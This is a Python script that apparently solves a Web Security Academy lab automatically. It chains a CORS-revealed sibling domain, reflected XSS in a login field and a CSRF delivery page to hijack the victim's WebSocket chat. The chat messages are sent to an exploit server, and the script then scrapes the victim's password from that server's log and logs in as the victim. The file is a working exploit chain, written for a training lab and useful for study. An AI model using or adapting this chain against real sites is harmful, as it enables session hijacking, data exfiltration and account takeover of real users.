from web_security_academy.core.logger import logger
from web_security_academy.core.utils import generate_csrf_html, read_file

from urllib.parse import urljoin, urlparse
from jinja2 import Environment
from requests import Request

import re


def solve_lab(session):
    # Explanation: The sibling domain can be found in the Access-Control-Allow-Origin
    # response header when requesting script or image files. Following the URL leads to a
    # login form whose username field is vulnerable to reflected XSS.

    # Therefore, I can deliver a CSRF payload to the victim, which will make a reflected
    # XSS POST request to the sibling domain. The JavaScript payload opens a (same-site)
    # WebSocket connection to the lab's live chat. Upon receiving any WebSocket messages,
    # the payload sends them to the exploit server, where they can be viewed.

    # Extract sibling domain
    resp = session.get_path("/resources/js/chat.js")
    sibling_domain = resp.headers["Access-Control-Allow-Origin"]
    logger.info(f"Sibling domain: {sibling_domain}")

    lab_server_hostname = urlparse(session.url).hostname
    exploit_server = session.exploit_server()

    # Render JavaScript template with appropriate URLs and use it to create POST request
    template = Environment().from_string(read_file("exploit.js").decode())
    javascript = template.render(
        lab_server=lab_server_hostname,
        exploit_server=exploit_server.hostname,
    )
    req = Request(
        "POST",
        urljoin(sibling_domain, "/login"),
        data={"username": f"<script>{javascript}</script>", "password": "123456"},
    )

    headers = "HTTP/1.1 200 OK\r\nContent-Type: text/html; charset=utf-8"
    body = generate_csrf_html(req)
    exploit_server.deliver_exploit_to_victim("/exploit", headers, body)

    # Extract carlos's password from exploit server access log
    log = exploit_server.access_log()
    password = re.search(r"%20([a-z0-9]{20})%22", log).group(1)
    logger.success(f"Extracted carlos's password from access log: {password}")
    session.login("carlos", password)
